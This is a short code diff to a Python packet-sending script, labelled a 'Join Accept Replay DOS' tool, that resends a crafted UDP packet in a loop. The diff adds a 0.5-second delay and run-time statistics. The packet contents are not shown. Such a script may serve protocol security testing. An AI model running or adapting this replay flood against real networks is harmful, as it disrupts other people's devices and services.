@@ -29,9 +29,22 @@ packet = ip / udp / payload
 # Get the number of times the packet should be sent from the command line argument
 num_times = int(sys.argv[1])
 
+# Get the start time
+start_time = time.time()
+
 # Send the packet to the destination IP address and port the specified number of times
 for i in range(num_times):
     send(packet)
-    time.sleep(0)
+    time.sleep(0.5)
 
+# Get the end time
+end_time = time.time()
+
+# Calculate the total execution time
+execution_time = end_time - start_time
+
+print("Join Accept Replay DOS Statistics")
 print(f"Packets sent: {num_times}")
+print(f"Start time: {time.ctime(start_time)}")
+print(f"End time: {time.ctime(end_time)}")
+print(f"Total execution time: {execution_time} seconds")
